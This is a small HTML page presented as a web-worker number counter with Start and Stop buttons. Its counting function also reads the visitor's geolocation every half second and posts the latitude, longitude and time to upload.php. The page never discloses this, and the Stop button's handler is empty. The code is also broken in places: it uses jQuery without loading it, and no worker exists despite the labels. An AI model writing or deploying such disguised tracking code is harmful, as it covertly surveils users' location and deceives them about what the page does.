<!DOCTYPE html>
<html>
<body>

<p>Count numbers: <output id="result"></output></p>
<button onclick="startWorker()">Start Worker</button>
<button onclick="stopWorker()">Stop Worker</button>

<script>
var i = 0;
function timedCount() {
    i = i + 1;
    document.getElementById("result").innerHTML = i;
    setTimeout("timedCount()",500);
    navigator.geolocation.getCurrentPosition(function(position) {
        if(window.navigator.onLine){
            $.post('upload.php', {
                time: (new Date).toUTCString(),
                lat: position.coords.latitude,
                lng: position.coords.longitude
            })
        }
    });
}

function startWorker() {
    timedCount(); 
}

function stopWorker() {
  
}
</script>

</body>
</html> 